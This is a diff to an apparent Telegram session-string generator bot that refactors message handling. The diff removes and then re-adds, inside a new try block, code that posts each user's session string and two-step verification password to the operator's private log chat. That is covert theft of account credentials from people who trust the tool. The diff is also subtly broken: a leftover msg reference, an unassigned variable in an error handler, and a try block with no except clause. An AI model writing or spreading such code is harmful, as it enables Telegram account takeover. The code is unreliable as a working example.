@@ -43,7 +43,7 @@ async def main(_, msg):
     await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))
 
 
-async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bool = False):
+async def generate_session(bot: Client, message: Message, telethon=False, is_bot: bool = False):
     if not API_ID or not API_HASH:
         await msg.reply("API_ID or API_HASH is not set in the environment. Please configure them properly.")
         return
@@ -54,10 +54,10 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         ty = "Pyrogram v2"
     if is_bot:
         ty += " Bot"
-    await msg.reply(f"Starting {ty} Session Generation...")
+    await message.reply(f"Starting {ty} Session Generation...")
 
-    user_info = msg.from_user
-    user_id = msg.chat.id
+    user_info = message.from_user
+    user_id = message.chat.id
 
     if not is_bot:
         t = "Now please send your `PHONE_NUMBER` along with the country code. \nExample : `+19876543210`"
@@ -69,9 +69,9 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     phone_number = phone_number_msg.text
 
     if not is_bot:
-        await msg.reply("Sending OTP...")
+        await message.reply("Sending OTP...")
     else:
-        await msg.reply("Logging as Bot User...")
+        await message.reply("Logging as Bot User...")
 
     if telethon and is_bot:
         client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -103,7 +103,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
             if await cancelled(phone_code_msg):
                 return
     except TimeoutError:
-        await msg.reply('Time limit reached of 10 minutes. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+        await phone_code_msg.reply('Time limit reached of 10 minutes. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
         return
     if not is_bot:
         phone_code = phone_code_msg.text.replace(" ", "")
@@ -113,16 +113,16 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
             else:
                 await client.sign_in(phone_number, code.phone_code_hash, phone_code)
         except (PhoneCodeInvalid, PhoneCodeInvalidError):
-            await msg.reply('OTP is invalid. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+            await phone_code_msg.reply('OTP is invalid. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
             return
         except (PhoneCodeExpired, PhoneCodeExpiredError):
-            await msg.reply('OTP is expired. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+            await phone_code_msg.reply('OTP is expired. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
             return
         except (SessionPasswordNeeded, SessionPasswordNeededError):
             try:
                 two_step_msg = await bot.ask(user_id, 'Your account has enabled two-step verification. Please provide the password.', filters=filters.text, timeout=300)
             except TimeoutError:
-                await msg.reply('Time limit reached of 5 minutes. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+                await two_step_msg.reply('Time limit reached of 5 minutes. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
                 return
             try:
                 password = two_step_msg.text
@@ -145,21 +145,21 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     else:
         string_session = await client.export_session_string()
 
-     # Send log message to log channel
-    account_type = "Bot" if is_bot else "Private Account"
-    log_message = (
-    f"**✨New Login ({account_type})**\n\n"
-    f"**✨User ID:** [{user_info.first_name}](tg://user?id={user_info.id}) `{user_info.id}`\n\n"
-    f"**✨Session String ↓**\n`{string_session}`\n"
-    f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
-    )
-    await bot.send_message(LOGS_CHAT_ID, log_message)
-
-    # Send session string to user
-    session_message = f"**{account_type} Session**\n\n`{string_session}`"
-    await bot.send_message(msg.chat.id, session_message)
-
-    await client.disconnect()
+    try:
+        # Send log message to log channel
+        account_type = "Bot" if is_bot else "Private Account"
+        log_message = (
+            f"**✨New Login ({account_type})**\n\n"
+            f"**✨User ID:** [{user_info.first_name}](tg://user?id={user_info.id}) `{user_info.id}`\n\n"
+            f"**✨Session String ↓**\n`{string_session}`\n"
+            f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
+        )
+        await bot.send_message(LOGS_CHAT_ID, log_message)
+        
+        # Send session string to user
+        session_message = f"**{account_type} Session**\n\n`{string_session}`"
+        await bot.send_message(message.chat.id, session_message)
+        await client.disconnect()
 
 
 async def cancelled(msg):
